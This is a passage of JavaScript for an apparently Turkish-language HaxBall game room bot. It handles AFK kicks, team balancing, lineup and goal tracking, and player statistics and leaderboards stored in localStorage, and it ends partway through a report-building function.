/* ACTIVITY FUNCTIONS */

function handleActivityPlayer(player) {
    let pComp = getPlayerComp(player);
    if (pComp != null) {
        pComp.inactivityTicks++;
        if (pComp.inactivityTicks == 60 * ((2 / 3) * afkLimit)) {
            room.sendAnnouncement(
                `⛔ ${player.name}, mesaj yada hareket etmezsen atılacaksın ${Math.floor(afkLimit / 4)} saniyen kaldı !`,
                player.id,
                warningColor,
                'bold',
                HaxNotification.MENTION
            );
            return;
        }
        if (pComp.inactivityTicks >= 60 * afkLimit) {
            pComp.inactivityTicks = 0;
            if (game.scores.time <= afkLimit - 0.5) {
                setTimeout(() => {
                    !chooseMode ? instantRestart() : room.stopGame();
                }, 10);
            }
            room.kickPlayer(player.id, 'AFK', false);
        }
    }
}

function handleActivityPlayerTeamChange(changedPlayer) {
    if (changedPlayer.team == Team.SPECTATORS) {
        let pComp = getPlayerComp(changedPlayer);
        if (pComp != null) pComp.inactivityTicks = 0;
    }
}

function handleActivityStop() {
    for (let player of players) {
        let pComp = getPlayerComp(player);
        if (pComp != null) pComp.inactivityTicks = 0;
    }
}

function handleActivity() {
    if (gameState === State.PLAY && players.length > 1) {
        for (let player of teamRed) {
            handleActivityPlayer(player);
        }
        for (let player of teamBlue) {
            handleActivityPlayer(player);
        }
    }
}

/* LINEUP FUNCTIONS */

function getStartingLineups() {
    var compositions = [[], []];
    for (let player of teamRed) {
        compositions[0].push(
            new PlayerComposition(player, authArray[player.id][0], [0], [])
        );
    }
    for (let player of teamBlue) {
        compositions[1].push(
            new PlayerComposition(player, authArray[player.id][0], [0], [])
        );
    }
    return compositions;
}

function handleLineupChangeTeamChange(changedPlayer) {
    if (gameState != State.STOP) {
        var playerLineup;
        if (changedPlayer.team == Team.RED) {
            // player gets in red team
            var redLineupAuth = game.playerComp[0].map((p) => p.auth);
            var ind = redLineupAuth.findIndex((auth) => auth == authArray[changedPlayer.id][0]);
            if (ind != -1) {
                // Player goes back in
                playerLineup = game.playerComp[0][ind];
                if (playerLineup.timeExit.includes(game.scores.time)) {
                    // gets subbed off then in at the exact same time -> no sub
                    playerLineup.timeExit = playerLineup.timeExit.filter((t) => t != game.scores.time);
                } else {
                    playerLineup.timeEntry.push(game.scores.time);
                }
            } else {
                playerLineup = new PlayerComposition(
                    changedPlayer,
                    authArray[changedPlayer.id][0],
                    [game.scores.time],
                    []
                );
                game.playerComp[0].push(playerLineup);
            }
        } else if (changedPlayer.team == Team.BLUE) {
            // player gets in blue team
            var blueLineupAuth = game.playerComp[1].map((p) => p.auth);
            var ind = blueLineupAuth.findIndex((auth) => auth == authArray[changedPlayer.id][0]);
            if (ind != -1) {
                // Player goes back in
                playerLineup = game.playerComp[1][ind];
                if (playerLineup.timeExit.includes(game.scores.time)) {
                    // gets subbed off then in at the exact same time -> no sub
                    playerLineup.timeExit = playerLineup.timeExit.filter((t) => t != game.scores.time);
                } else {
                    playerLineup.timeEntry.push(game.scores.time);
                }
            } else {
                playerLineup = new PlayerComposition(
                    changedPlayer,
                    authArray[changedPlayer.id][0],
                    [game.scores.time],
                    []
                );
                game.playerComp[1].push(playerLineup);
            }
        }
        if (teamRed.some((r) => r.id == changedPlayer.id)) {
            // player leaves red team
            var redLineupAuth = game.playerComp[0].map((p) => p.auth);
            var ind = redLineupAuth.findIndex((auth) => auth == authArray[changedPlayer.id][0]);
            playerLineup = game.playerComp[0][ind];
            if (playerLineup.timeEntry.includes(game.scores.time)) {
                // gets subbed off then in at the exact same time -> no sub
                if (game.scores.time == 0) {
                    game.playerComp[0].splice(ind, 1);
                } else {
                    playerLineup.timeEntry = playerLineup.timeEntry.filter((t) => t != game.scores.time);
                }
            } else {
                playerLineup.timeExit.push(game.scores.time);
            }
        } else if (teamBlue.some((r) => r.id == changedPlayer.id)) {
            // player leaves blue team
            var blueLineupAuth = game.playerComp[1].map((p) => p.auth);
            var ind = blueLineupAuth.findIndex((auth) => auth == authArray[changedPlayer.id][0]);
            playerLineup = game.playerComp[1][ind];
            if (playerLineup.timeEntry.includes(game.scores.time)) {
                // gets subbed off then in at the exact same time -> no sub
                if (game.scores.time == 0) {
                    game.playerComp[1].splice(ind, 1);
                } else {
                    playerLineup.timeEntry = playerLineup.timeEntry.filter((t) => t != game.scores.time);
                }
            } else {
                playerLineup.timeExit.push(game.scores.time);
            }
        }
    }
}

function handleLineupChangeLeave(player) {
    if (playSituation != Situation.STOP) {
        if (player.team == Team.RED) {
            // player gets in red team
            var redLineupAuth = game.playerComp[0].map((p) => p.auth);
            var ind = redLineupAuth.findIndex((auth) => auth == authArray[player.id][0]);
            var playerLineup = game.playerComp[0][ind];
            if (playerLineup.timeEntry.includes(game.scores.time)) {
                // gets subbed off then in at the exact same time -> no sub
                if (game.scores.time == 0) {
                    game.playerComp[0].splice(ind, 1);
                } else {
                    playerLineup.timeEntry = playerLineup.timeEntry.filter((t) => t != game.scores.time);
                }
            } else {
                playerLineup.timeExit.push(game.scores.time);
            }
        } else if (player.team == Team.BLUE) {
            // player gets in blue team
            var blueLineupAuth = game.playerComp[1].map((p) => p.auth);
            var ind = blueLineupAuth.findIndex((auth) => auth == authArray[player.id][0]);
            var playerLineup = game.playerComp[1][ind];
            if (playerLineup.timeEntry.includes(game.scores.time)) {
                // gets subbed off then in at the exact same time -> no sub
                if (game.scores.time == 0) {
                    game.playerComp[1].splice(ind, 1);
                } else {
                    playerLineup.timeEntry = playerLineup.timeEntry.filter((t) => t != game.scores.time);
                }
            } else {
                playerLineup.timeExit.push(game.scores.time);
            }
        }
    }
}

/* TEAM BALANCE FUNCTIONS */

function balanceTeams() {
    if (!chooseMode) {
        if (players.length == 0) {
            room.stopGame();
            room.setScoreLimit(scoreLimit);
            room.setTimeLimit(timeLimit);
        } else if (players.length == 1 && teamRed.length == 0) {
            instantRestart();
            setTimeout(() => {
                stadiumCommand(emptyPlayer, `!training`);
            }, 5);
            room.setPlayerTeam(players[0].id, Team.RED);
        } else if (Math.abs(teamRed.length - teamBlue.length) == teamSpec.length && teamSpec.length > 0) {
            const n = Math.abs(teamRed.length - teamBlue.length);
            if (players.length == 2) {
                instantRestart();
                setTimeout(() => {
                    stadiumCommand(emptyPlayer, `!classic`);
                }, 5);
            }
            if (teamRed.length > teamBlue.length) {
                for (var i = 0; i < n; i++) {
                    room.setPlayerTeam(teamSpec[i].id, Team.BLUE);
                }
            } else {
                for (var i = 0; i < n; i++) {
                    room.setPlayerTeam(teamSpec[i].id, Team.RED);
                }
            }
        } else if (Math.abs(teamRed.length - teamBlue.length) > teamSpec.length) {
            const n = Math.abs(teamRed.length - teamBlue.length);
            if (players.length == 1) {
                instantRestart();
                setTimeout(() => {
                    stadiumCommand(emptyPlayer, `!training`);
                }, 5);
                room.setPlayerTeam(players[0].id, Team.RED);
                return;
            } else if (teamSize > 2 && players.length == 5) {
                instantRestart();
                setTimeout(() => {
                    stadiumCommand(emptyPlayer, `!classic`);
                }, 5);
            }
            if (players.length == teamSize * 2 - 1) {
                teamRedStats = [];
                teamBlueStats = [];
            }
            if (teamRed.length > teamBlue.length) {
                for (var i = 0; i < n; i++) {
                    room.setPlayerTeam(
                        teamRed[teamRed.length - 1 - i].id,
                        Team.SPECTATORS
                    );
                }
            } else {
                for (var i = 0; i < n; i++) {
                    room.setPlayerTeam(
                        teamBlue[teamBlue.length - 1 - i].id,
                        Team.SPECTATORS
                    );
                }
            }
        } else if (Math.abs(teamRed.length - teamBlue.length) < teamSpec.length && teamRed.length != teamBlue.length) {
            room.pauseGame(true);
            activateChooseMode();
            choosePlayer();
        } else if (teamSpec.length >= 2 && teamRed.length == teamBlue.length && teamRed.length < teamSize) {
            if (teamRed.length == 2) {
                instantRestart();
                setTimeout(() => {
                    stadiumCommand(emptyPlayer, `!big`);
                }, 5);
            }
            topButton();
        }
    }
}

function handlePlayersJoin() {
    if (chooseMode) {
        if (teamSize > 2 && players.length == 6) {
            setTimeout(() => {
                stadiumCommand(emptyPlayer, `!big`);
            }, 5);
        }
        getSpecList(teamRed.length <= teamBlue.length ? teamRed[0] : teamBlue[0]);
    }
    balanceTeams();
}

function handlePlayersLeave() {
    if (gameState != State.STOP) {
        var scores = room.getScores();
        if (players.length >= 2 * teamSize && scores.time >= (5 / 6) * game.scores.timeLimit && teamRed.length != teamBlue.length) {
            var rageQuitCheck = false;
            if (teamRed.length < teamBlue.length) {
                if (scores.blue - scores.red == 2) {
                    endGame(Team.BLUE);
                    rageQuitCheck = true;
                }
            } else {
                if (scores.red - scores.blue == 2) {
                    endGame(Team.RED);
                    rageQuitCheck = true;
                }
            }
            if (rageQuitCheck) {
                room.sendAnnouncement(
                    "Ragequit detected, game ended.",
                    null,
                    infoColor,
                    'bold',
                    HaxNotification.MENTION
                )
                stopTimeout = setTimeout(() => {
                    room.stopGame();
                }, 100);
                return;
            }
        }
    }
    if (chooseMode) {
        if (teamSize > 2 && players.length == 5) {
            setTimeout(() => {
                stadiumCommand(emptyPlayer, `!classic`);
            }, 5);
        }
        if (teamRed.length == 0 || teamBlue.length == 0) {
            room.setPlayerTeam(teamSpec[0].id, teamRed.length == 0 ? Team.RED : Team.BLUE);
            return;
        }
        if (Math.abs(teamRed.length - teamBlue.length) == teamSpec.length) {
            deactivateChooseMode();
            resumeGame();
            var b = teamSpec.length;
            if (teamRed.length > teamBlue.length) {
                for (var i = 0; i < b; i++) {
                    clearTimeout(insertingTimeout);
                    insertingPlayers = true;
                    setTimeout(() => {
                        room.setPlayerTeam(teamSpec[0].id, Team.BLUE);
                    }, 5 * i);
                }
                insertingTimeout = setTimeout(() => {
                    insertingPlayers = false;
                }, 5 * b);
            } else {
                for (var i = 0; i < b; i++) {
                    clearTimeout(insertingTimeout);
                    insertingPlayers = true;
                    setTimeout(() => {
                        room.setPlayerTeam(teamSpec[0].id, Team.RED);
                    }, 5 * i);
                }
                insertingTimeout = setTimeout(() => {
                    insertingPlayers = false;
                }, 5 * b);
            }
            return;
        }
        if (streak == 0 && gameState == State.STOP) {
            if (Math.abs(teamRed.length - teamBlue.length) == 2) {
                var teamIn = teamRed.length > teamBlue.length ? teamRed : teamBlue;
                room.setPlayerTeam(teamIn[teamIn.length - 1].id, Team.SPECTATORS)
            }
        }
        if (teamRed.length == teamBlue.length && teamSpec.length < 2) {
            deactivateChooseMode();
            resumeGame();
            return;
        }

        if (capLeft) {
            choosePlayer();
        } else {
            getSpecList(teamRed.length <= teamBlue.length ? teamRed[0] : teamBlue[0]);
        }
    }
    balanceTeams();
}

function handlePlayersTeamChange(byPlayer) {
    if (chooseMode && !removingPlayers && byPlayer == null) {
        if (Math.abs(teamRed.length - teamBlue.length) == teamSpec.length) {
            deactivateChooseMode();
            resumeGame();
            var b = teamSpec.length;
            if (teamRed.length > teamBlue.length) {
                for (var i = 0; i < b; i++) {
                    clearTimeout(insertingTimeout);
                    insertingPlayers = true;
                    setTimeout(() => {
                        room.setPlayerTeam(teamSpec[0].id, Team.BLUE);
                    }, 5 * i);
                }
                insertingTimeout = setTimeout(() => {
                    insertingPlayers = false;
                }, 5 * b);
            } else {
                for (var i = 0; i < b; i++) {
                    clearTimeout(insertingTimeout);
                    insertingPlayers = true;
                    setTimeout(() => {
                        room.setPlayerTeam(teamSpec[0].id, Team.RED);
                    }, 5 * i);
                }
                insertingTimeout = setTimeout(() => {
                    insertingPlayers = false;
                }, 5 * b);
            }
            return;
        } else if (
            (teamRed.length == teamSize && teamBlue.length == teamSize) ||
            (teamRed.length == teamBlue.length && teamSpec.length < 2)
        ) {
            deactivateChooseMode();
            resumeGame();
        } else if (teamRed.length <= teamBlue.length && redCaptainChoice != '') {
            if (redCaptainChoice == 'top') {
                room.setPlayerTeam(teamSpec[0].id, Team.RED);
            } else if (redCaptainChoice == 'random') {
                var r = getRandomInt(teamSpec.length);
                room.setPlayerTeam(teamSpec[r].id, Team.RED);
            } else {
                room.setPlayerTeam(teamSpec[teamSpec.length - 1].id, Team.RED);
            }
            return;
        } else if (teamBlue.length < teamRed.length && blueCaptainChoice != '') {
            if (blueCaptainChoice == 'top') {
                room.setPlayerTeam(teamSpec[0].id, Team.BLUE);
            } else if (blueCaptainChoice == 'random') {
                var r = getRandomInt(teamSpec.length);
                room.setPlayerTeam(teamSpec[r].id, Team.BLUE);
            } else {
                room.setPlayerTeam(teamSpec[teamSpec.length - 1].id, Team.BLUE);
            }
            return;
        } else {
            choosePlayer();
        }
    }
}

function handlePlayersStop(byPlayer) {
    if (byPlayer == null && endGameVariable) {
        if (chooseMode) {
            if (players.length == 2 * teamSize) {
                chooseMode = false;
                resetButton();
                for (var i = 0; i < teamSize; i++) {
                    clearTimeout(insertingTimeout);
                    insertingPlayers = true;
                    setTimeout(() => {
                        randomButton();
                    }, 200 * i);
                }
                insertingTimeout = setTimeout(() => {
                    insertingPlayers = false;
                }, 200 * teamSize);
                startTimeout = setTimeout(() => {
                    room.startGame();
                }, 2000);
            } else {
                if (lastWinner == Team.RED) {
                    blueToSpecButton();
                } else if (lastWinner == Team.BLUE) {
                    redToSpecButton();
                    setTimeout(() => {
                        swapButton();
                    }, 10);
                } else {
                    resetButton();
                }
                clearTimeout(insertingTimeout);
                insertingPlayers = true;
                setTimeout(() => {
                    topButton();
                }, 300);
                insertingTimeout = setTimeout(() => {
                    insertingPlayers = false;
                }, 300);
            }
        } else {
            if (players.length == 2) {
                if (lastWinner == Team.BLUE) {
                    swapButton();
                }
                startTimeout = setTimeout(() => {
                    room.startGame();
                }, 2000);
            } else if (players.length == 3 || players.length >= 2 * teamSize + 1) {
                if (lastWinner == Team.RED) {
                    blueToSpecButton();
                } else {
                    redToSpecButton();
                    setTimeout(() => {
                        swapButton();
                    }, 5);
                }
                clearTimeout(insertingTimeout);
                insertingPlayers = true;
                setTimeout(() => {
                    topButton();
                }, 200);
                insertingTimeout = setTimeout(() => {
                    insertingPlayers = false;
                }, 300);
                startTimeout = setTimeout(() => {
                    room.startGame();
                }, 2000);
            } else if (players.length == 4) {
                clearTimeout(insertingTimeout);
                insertingPlayers = true;
                setTimeout(() => {
                    randomButton();
                    setTimeout(() => {
                        randomButton();
                    }, 500);
                }, 500);
                insertingTimeout = setTimeout(() => {
                    insertingPlayers = false;
                }, 2000);
                startTimeout = setTimeout(() => {
                    room.startGame();
                }, 2000);
            } else if (players.length == 5 || players.length >= 2 * teamSize + 1) {
                if (lastWinner == Team.RED) {
                    blueToSpecButton();
                } else {
                    redToSpecButton();
                    setTimeout(() => {
                        swapButton();
                    }, 5);
                }
                clearTimeout(insertingTimeout);
                insertingPlayers = true;
                insertingTimeout = setTimeout(() => {
                    insertingPlayers = false;
                }, 200);
                setTimeout(() => {
                    topButton();
                }, 200);
                activateChooseMode();
            } else if (players.length == 6) {
                clearTimeout(insertingTimeout);
                insertingPlayers = true;
                insertingTimeout = setTimeout(() => {
                    insertingPlayers = false;
                }, 1500);
                setTimeout(() => {
                    randomButton();
                    setTimeout(() => {
                        randomButton();
                        setTimeout(() => {
                            randomButton();
                        }, 500);
                    }, 500);
                }, 500);
                startTimeout = setTimeout(() => {
                    room.startGame();
                }, 2000);
            }
        }
    }
}

/* STATS FUNCTIONS */

/* GK FUNCTIONS */





function getGK(team) {
    if (team == Team.SPECTATORS) {
        return null;
    }
    let teamArray = team == Team.RED ? game.playerComp[0] : game.playerComp[1];
    let playerGK = teamArray.reduce((prev, current) => {
        return (prev?.GKTicks > current.GKTicks) ? prev : current
    }, null);
    return playerGK;
}

function getCS(scores) {
    let playersNameCS = [];
    let redGK = getGK(Team.RED);
    let blueGK = getGK(Team.BLUE);
    if (redGK != null && scores.blue == 0) {
        playersNameCS.push(redGK.player.name);
    }
    if (blueGK != null && scores.red == 0) {
        playersNameCS.push(blueGK.player.name);
    }
    return playersNameCS;
}

function getCSString(scores) {
    let playersCS = getCS(scores);
    if (playersCS.length == 0) {
        return "🥅 Kaleci yoktu.";
    } else if (playersCS.length == 1) {
        return `🥅 Kalede ${playersCS[0]} vardı.`;
    } else {
        return `🥅 Kalede ${playersCS[0]} ve ${playersCS[1]} vardı.`;
    }
}

/* GLOBAL STATS FUNCTIONS */
var powerActive = false; //You can kick the ball faster when this is true.
var PowerCoefficient = 2; //Original ball kick speed would be multiplied by this number when power shot is activated.
var TimeOut = 90; //This means 1.5 seconds.
var TimePlayerBallTouch = 0; //The time indicator that increases as player touched to the ball

function getLastTouchOfTheBall() {
    const ballPosition = room.getBallPosition();
    updateTeams();
    let playerArray = [];
    for (let player of players) {
        if (player.position != null) {
            var distanceToBall = pointDistance(player.position, ballPosition);
            if (distanceToBall < triggerDistance) {
                if (playSituation == Situation.KICKOFF) playSituation = Situation.PLAY;
                playerArray.push([player, distanceToBall]);
            }
        }
    }
    if (playerArray.length != 0) {
        let playerTouch = playerArray.sort((a, b) => a[1] - b[1])[0][0];
        if (lastTeamTouched == playerTouch.team || lastTeamTouched == Team.SPECTATORS) {
            if (lastTouches[0] == null || (lastTouches[0] != null && lastTouches[0].player.id != playerTouch.id)) {
                game.touchArray.push(
                    new BallTouch(
                        playerTouch,
                        game.scores.time,
                        getGoalGame(),
                        ballPosition
                    )
                );
                lastTouches[0] = checkGoalKickTouch(
                    game.touchArray,
                    game.touchArray.length - 1,
                    getGoalGame()
                );
                lastTouches[1] = checkGoalKickTouch(
                    game.touchArray,
                    game.touchArray.length - 2,
                    getGoalGame()
                );
            }
        }
        lastTeamTouched = playerTouch.team;
    }
}

function getBallSpeed() {
    var ballProp = room.getDiscProperties(0);
    return Math.sqrt(ballProp.xspeed ** 2 + ballProp.yspeed ** 2) * speedCoefficient;
}

function getGameStats() {
    if (playSituation == Situation.PLAY && gameState == State.PLAY) {
        lastTeamTouched == Team.RED ? possession[0]++ : possession[1]++;
        var ballPosition = room.getBallPosition();
        ballPosition.x < 0 ? actionZoneHalf[0]++ : actionZoneHalf[1]++;
    }
}

/* GOAL ATTRIBUTION FUNCTIONS */

function getGoalAttribution(team) {
    var goalAttribution = Array(2).fill(null);
    if (lastTouches[0] != null) {
        if (lastTouches[0].player.team == team) {
            // Direct goal scored by player
            if (lastTouches[1] != null && lastTouches[1].player.team == team) {
                goalAttribution = [lastTouches[0].player, lastTouches[1].player];
            } else {
                goalAttribution = [lastTouches[0].player, null];
            }
        } else {
            // Own goal
            goalAttribution = [lastTouches[0].player, null];
        }
    }
    return goalAttribution;
}

function getGoalString(team) {
    var goalString;
    var scores = game.scores;
    var goalAttribution = getGoalAttribution(team);
    if (goalAttribution[0] != null) {
        if (goalAttribution[0].team == team) {
            if (goalAttribution[1] != null && goalAttribution[1].team == team) {
                goalString = `⚽ ${getTimeGame(scores.time)} Golü atan kişi ${goalAttribution[0].name} ! Asisti Yapan ${goalAttribution[1].name}. Şut Hızı : ${ballSpeed.toFixed(2)}km/h 💨`;
                game.goals.push(
                    new Goal(
                        scores.time,
                        team,
                        goalAttribution[0],
                        goalAttribution[1]
                    )
                );
            playersGoals[goalAttribution[0].name]++;
            playerPoints[goalAttribution[0].name] += 3;
            playersXP[goalAttribution[0].name] += 5;
            assisters[goalAttribution[1].name]++;
            playerPoints[goalAttribution[1].name] += 1;
            playersXP[goalAttribution[1].name] += 3;
            } else {
                goalString = `⚽ ${getTimeGame(scores.time)} Golü Atan İsim ${goalAttribution[0].name} ! Şut Hızı : ${ballSpeed.toFixed(2)}km/h ‍💨`;
                game.goals.push(
                    new Goal(scores.time, team, goalAttribution[0], null)
                );
            playersGoals[goalAttribution[0].name]++;
            playerPoints[goalAttribution[0].name] += 3;
            playersXP[goalAttribution[0].name] += 5;
            }
        } else {
        var responses = ['😂', '🤣', '😫', '😐', '😡', '💩', '🤢', '❌', '💔'];
        var randomEmojikendikale = responses[Math.floor(Math.random() * responses.length)];
            goalString = `${randomEmojikendikale} ${getTimeGame(scores.time)} ${goalAttribution[0].name} Kendi Kalesine atıyor ! Şut Hızı : ${ballSpeed.toFixed(2)}km/h ‍💨`;
            game.goals.push(
                new Goal(scores.time, team, goalAttribution[0], null)
            );
            ownGoals[goalAttribution[0].name]++;
            playerPoints[goalAttribution[0].name] -= 1;
        }
    } else {
        goalString = `⚽ ${getTimeGame(scores.time)} ${team == Team.RED ? 'red' : 'blue'} Takımın Golü ! Şut Hızı : ${ballSpeed.toFixed(2)}km/h ‍💨`;
        game.goals.push(
            new Goal(scores.time, team, null, null)
        );
    }

    return goalString;
}

/* ROOM STATS FUNCTIONS */

function updatePlayerStats(player, teamStats) {
    var stats = new HaxStatistics(player.name);
    var pComp = getPlayerComp(player);
    if (localStorage.getItem(authArray[player.id][0])) {
        stats = JSON.parse(localStorage.getItem(authArray[player.id][0]));
    }
    stats.games++;
    if (lastWinner == teamStats) stats.wins++;
    stats.winrate = ((100 * stats.wins) / (stats.games || 1)).toFixed(1) + `%`;
    stats.goals += getGoalsPlayer(pComp);
    stats.assists += getAssistsPlayer(pComp);
    stats.ownGoals += getOwnGoalsPlayer(pComp);
    stats.CS += getCSPlayer(pComp);
    stats.playtime += getGametimePlayer(pComp);
    localStorage.setItem(authArray[player.id][0], JSON.stringify(stats));
}

function updateStats() {
    if (
        players.length >= 2 * teamSize &&
        (
            game.scores.time >= (5 / 6) * game.scores.timeLimit ||
            game.scores.red == game.scores.scoreLimit ||
            game.scores.blue == game.scores.scoreLimit
        ) &&
        teamRedStats.length >= teamSize && teamBlueStats.length >= teamSize
    ) {
        for (let player of teamRedStats) {
            updatePlayerStats(player, Team.RED);
        }
        for (let player of teamBlueStats) {
            updatePlayerStats(player, Team.BLUE);
        }
    }
}

function printRankings(statKey, id = 0) {
    var leaderboard = [];
    statKey = statKey == "cs" ? "CS" : statKey;
    for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        if (key.length == 43)
            leaderboard.push([
                JSON.parse(localStorage.getItem(key)).playerName,
                JSON.parse(localStorage.getItem(key))[statKey],
            ]);
    }
    if (leaderboard.length < 5) {
        if (id != 0) {
            room.sendAnnouncement(
                'Not enough games played yet !',
                id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            );
        }
        return;
    }
    leaderboard.sort(function (a, b) { return b[1] - a[1]; });
    var rankingString = `${statKey.charAt(0).toUpperCase() + statKey.slice(1)}> `;
    for (let i = 0; i < 5; i++) {
        let playerName = leaderboard[i][0];
        let playerStat = leaderboard[i][1];
        if (statKey == 'playtime') playerStat = getTimeStats(playerStat);
        rankingString += `#${i + 1} ${playerName} : ${playerStat}, `;
    }
    rankingString = rankingString.substring(0, rankingString.length - 2);
    room.sendAnnouncement(
        rankingString,
        id,
        infoColor,
        'bold',
        HaxNotification.CHAT
    );
}

/* GET STATS FUNCTIONS */

function getGamePlayerStats(player) {
    var stats = new HaxStatistics(player.name);
    var pComp = getPlayerComp(player);
    stats.goals += getGoalsPlayer(pComp);
    stats.assists += getAssistsPlayer(pComp);
    stats.ownGoals += getOwnGoalsPlayer(pComp);
    stats.playtime += getGametimePlayer(pComp);
    stats.CS += getCSPlayer(pComp);
    return stats;
}

function getGametimePlayer(pComp) {
    if (pComp == null) return 0;
    var timePlayer = 0;
    for (let j = 0; j < pComp.timeEntry.length; j++) {
        if (pComp.timeExit.length < j + 1) {
            timePlayer += game.scores.time - pComp.timeEntry[j];
        } else {
            timePlayer += pComp.timeExit[j] - pComp.timeEntry[j];
        }
    }
    return Math.floor(timePlayer);
}

function getGoalsPlayer(pComp) {
    if (pComp == null) return 0;
    var goalPlayer = 0;
    for (let goal of game.goals) {
        if (goal.striker != null && goal.team === pComp.player.team) {
            if (authArray[goal.striker.id][0] == pComp.auth) {
                goalPlayer++;
            }
        }
    }
    return goalPlayer;
}

function getOwnGoalsPlayer(pComp) {
    if (pComp == null) return 0;
    var goalPlayer = 0;
    for (let goal of game.goals) {
        if (goal.striker != null && goal.team !== pComp.player.team) {
            if (authArray[goal.striker.id][0] == pComp.auth) {
                goalPlayer++;
            }
        }
    }
    return goalPlayer;
}

function getAssistsPlayer(pComp) {
    if (pComp == null) return 0;
    var assistPlayer = 0;
    for (let goal of game.goals) {
        if (goal.assist != null) {
            if (authArray[goal.assist.id][0] == pComp.auth) {
                assistPlayer++;
            }
        }
    }
    return assistPlayer;
}

function getGKPlayer(pComp) {
    if (pComp == null) return 0;
    let GKRed = getGK(Team.RED);
    if (pComp.auth == GKRed?.auth) {
        return Team.RED;
    }
    let GKBlue = getGK(Team.BLUE);
    if (pComp.auth == GKBlue?.auth) {
        return Team.BLUE;
    }
    return Team.SPECTATORS;
}

function getCSPlayer(pComp) {
    if (pComp == null || game.scores == null) return 0;
    if (getGKPlayer(pComp) == Team.RED && game.scores.blue == 0) {
        return 1;
    } else if (getGKPlayer(pComp) == Team.BLUE && game.scores.red == 0) {
        return 1;
    }
    return 0;
}

function actionReportCountTeam(goals, team) {
    let playerActionSummaryTeam = [];
    let indexTeam = team == Team.RED ? 0 : 1;
    let indexOtherTeam = team == Team.RED ? 1 : 0;
    for (let goal of goals[indexTeam]) {
        if (goal[0] != null) {
            if (playerActionSummaryTeam.find(a => a[0].id == goal[0].id)) {
                let index = playerActionSummaryTeam.findIndex(a => a[0].id == goal[0].id);
                playerActionSummaryTeam[index][1]++;
            } else {
                playerActionSummaryTeam.push([goal[0], 1, 0, 0]);
            }
            if (goal[1] != null) {
                if (playerActionSummaryTeam.find(a => a[0].id == goal[1].id)) {
                    let index = playerActionSummaryTeam.findIndex(a => a[0].id == goal[1].id);
                    playerActionSummaryTeam[index][2]++;
                } else {
                    playerActionSummaryTeam.push([goal[1], 0, 1, 0]);
                }
            }
        }
    }
    if (goals[indexOtherTeam].length == 0) {
        let playerCS = getGK(team)?.player;
        if (playerCS != null) {
            if (playerActionSummaryTeam.find(a => a[0].id == playerCS.id)) {
                let index = playerActionSummaryTeam.findIndex(a => a[0].id == playerCS.id);
                playerActionSummaryTeam[index][3]++;
            } else {
                playerActionSummaryTeam.push([playerCS, 0, 0, 1]);
            }
        }
    }

    playerActionSummaryTeam.sort((a, b) => (a[1] + a[2] + a[3]) - (b[1] + b[2] + b[3]));
    return playerActionSummaryTeam;
}

/* PRINT FUNCTIONS */

function printPlayerStats(stats) {
    let statsString = '';
    for (let [key, value] of Object.entries(stats)) {
        if (key == 'playerName') statsString += `${value}: `;
        else {
            if (key == 'playtime') value = getTimeStats(value);
            let reCamelCase = /([A-Z](?=[a-z]+)|[A-Z]+(?![a-z]))/g;
            let statName = key.replaceAll(reCamelCase, ' $1').trim();
            statsString += `${statName.charAt(0).toUpperCase() + statName.slice(1)}: ${value}, `;
        }
    }
    statsString = statsString.substring(0, statsString.length - 2);
    return statsString;
}

/* FETCH FUNCTIONS */

function fetchGametimeReport(game) {
    var fieldGametimeRed = {
        name: '🔴        **KIRMIZI TAKIM İSTATİSTİKLERİ**',
        value: '⌛ __**Oynama Süresi:**__\n\n',
        inline: true,
    };
    var fieldGametimeBlue = {
        name: '🔵       **MAVİ TAKIM İSTATİSTİKLERİ**',
        value: '⌛ __**Oynama Süresi:**__\n\n',
        inline: true,
    };
    var redTeamTimes = game.playerComp[0].map((p) => [p.player, getGametimePlayer(p)]);
    var blueTeamTimes = game.playerComp[1].map((p) => [p.player, getGametimePlayer(p)]);

    for (let time of redTeamTimes) {
        var minutes = getMinutesReport(time[1]);
        var seconds = getSecondsReport(time[1]);
        fieldGametimeRed.value += `> **${time[0].name}:** ${minutes > 0 ? `${minutes}m` : ''}` +
            `${seconds > 0 || minutes == 0 ? `${seconds}s` : ''}\n`;
    }
    fieldGametimeRed.value += `\n${blueTeamTimes.length - redTeamTimes.length > 0 ? '\n'.repeat(blueTeamTimes.length - redTeamTimes.length) : ''
        }`;
    fieldGametimeRed.value += '=====================';

    for (let time of blueTeamTimes) {
        var minutes = getMinutesReport(time[1]);
        var seconds = getSecondsReport(time[1]);
        fieldGametimeBlue.value += `> **${time[0].name}:** ${minutes > 0 ? `${minutes}m` : ''}` +
            `${seconds > 0 || minutes == 0 ? `${seconds}s` : ''}\n`;
    }
    fieldGametimeBlue.value += `\n${redTeamTimes.length - blueTeamTimes.length > 0 ? '\n'.repeat(redTeamTimes.length - blueTeamTimes.length) : ''
        }`;
    fieldGametimeBlue.value += '=====================';

    return [fieldGametimeRed, fieldGametimeBlue];
}

function fetchActionsSummaryReport(game) {
    var fieldReportRed = {
        name: '🔴        **KIRMIZI TAKIM İSTATİSTİKLERİ**',
        value: '📊 __**Oyuncu İstatistikleri:**__\n\n',
        inline: true,
    };
    var fieldReportBlue = {
        name: '🔵       **MAVİ TAKIM İSTATİSTİKLERİ**',
        value: '📊 __**Oyuncu İstatistikleri:**__\n\n',
        inline: true,
    };
    var goals = [[], []];
    for (let i = 0; i < game.goals.length; i++) {
        goals[game.goals[i].team - 1].push([game.goals[i].striker, game.goals[i].assist]);
    }
    var redActions = actionReportCountTeam(goals, Team.RED);
    if (redActions.length > 0) {
        for (let act of redActions) {
            fieldReportRed.value += `> **${act[0].team != Team.RED ? '[OG] ' : ''}${act[0].name}:**` +
                `${act[1] > 0 ? ` ${act[1]}G` : ''}` +
                `${act[2] > 0 ? ` ${act[2]}A` : ''}` +
                `${act[3] > 0 ? ` ${act[3]}CS` : ''}\n`;
        }
    }
    var blueActions = actionReportCountTeam(goals, Team.BLUE);
    if (blueActions.length > 0) {
        for (let act of blueActions) {
            fieldReportBlue.value += `> **${act[0].team != Team.BLUE ? '[OG] ' : ''}${act[0].name}:**` +
                `${act[1] > 0 ? ` ${act[1]}G` : ''}` +
                `${act[2] > 0 ? ` ${act[2]}A` : ''}` +
                `${act[3] > 0 ? ` ${act[3]}CS` : ''}\n`;
        }
    }

    fieldReportRed.value += `\n${blueActions.length - redActions.length > 0 ? '\n'.repeat(blueActions.length - redActions.length) : ''
        }`;
    fieldReportRed.value += '=====================';

